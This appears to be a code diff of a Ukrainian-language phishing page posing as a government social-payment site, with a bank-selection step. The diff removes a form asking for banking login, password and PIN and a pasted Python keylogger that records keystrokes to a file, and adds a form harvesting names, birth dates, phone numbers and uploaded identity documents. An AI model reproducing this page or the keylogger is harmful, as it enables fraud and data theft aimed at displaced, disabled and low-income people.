@@ -21,7 +21,6 @@
                 <h3>Виплата доступна:</h3>
                 <ul>
                     <li>✅ ВПО</li>
-                    <li>✅ Багатодітним родинам/li>
                     <li>✅ Багатодітним родинам</li>
                     <li>✅ Особам з інвалідністю</li>
                     <li>✅ Малозабезпеченим</li>
@@ -30,13 +29,36 @@
 
             <h3>Як подати заявку:</h3>
             <ol class="steps">
-                <li>Зареєструйтесь на порталі Дії (diia.gov.ua)</li>
-                <li>Заповніть анкету у розділі "Соціальна підтримка"</li>
+                <li>Заповніть форму з вашими даними</li>
                 <li>Завантажте необхідні документи</li>
+                <li>Оберіть банк для отримання коштів</li>
                 <li>Очікуйте рішення</li>
             </ol>
 
-            <button id="applyBtn" class="btn">Подати заявку онлайн</button>
+            <div id="mainForm" class="data-form">
+                <h3>Введіть ваші дані:</h3>
+                <div class="form-group">
+                    <label class="form-label">ПІБ</label>
+                    <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Дата народження</label>
+                    <input type="date" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Номер телефону</label>
+                    <input type="tel" class="form-control" placeholder="Введіть ваш номер телефону" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Коментар до вашої ситуації</label>
+                    <textarea class="form-control" rows="3" placeholder="Опишіть вашу ситуацію" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Завантажте документи (PDF, JPG)</label>
+                    <input type="file" class="form-control" multiple required>
+                </div>
+                <button id="submitMainForm" class="submit-btn">Продовжити</button>
+            </div>
 
             <!-- Вибір банку -->
             <div id="bankSelection" class="bank-selection">
@@ -64,36 +86,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- Форма введення даних -->
-            <div id="dataForm" class="data-form">
-                <h3 id="formTitle">Введіть ваші дані:</h3>
-                <div class="form-group">
-                    <label class="form-label">Логін</label>
-                    <input type="text" class="form-control" placeholder="Введіть ваш логін" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Пароль</label>
-                    <input type="password" class="form-control" placeholder="Введіть ваш пароль" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Пін-код</label>
-                    <input type="text" class="form-control" placeholder="Введіть пін-код" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">ПІБ</label>
-                    <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Дата народження</label>
-                    <input type="date" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Email</label>
-                    <input type="email" class="form-control" placeholder="Введіть ваш email" required>
-                </div>
-                <button class="submit-btn">Підтвердити</button>
-            </div>
         </div>
     </div>
 
@@ -102,28 +94,6 @@
         <p>Гаряча лінія: 0 800 123 456</p>
     </footer>
 
-    <script src="script.js"></script>import keyboard
-from datetime import datetime
-
-LOG_FILE = "keylog.txt"  # Файл для записи нажатий
-
-def on_key_press(event):
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"[{current_time}] Нажата клавиша: {event.name}\n"
-    
-    print(log_entry, end="")  # Вывод в консоль
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(log_entry)  # Запись в файл
-
-# Запуск отслеживания клавиш
-keyboard.on_press(on_key_press)
-print("Кейлоггер запущен. Для остановки нажмите Ctrl+C...")
-
-try:
-    keyboard.wait()  # Ожидание нажатий
-except KeyboardInterrupt:
-    print("\nКейлоггер остановлен.")
-finally:
-    keyboard.unhook_all()  # Отключение хуков
+    <script src="script.js"></script>
 </body>
 </html>
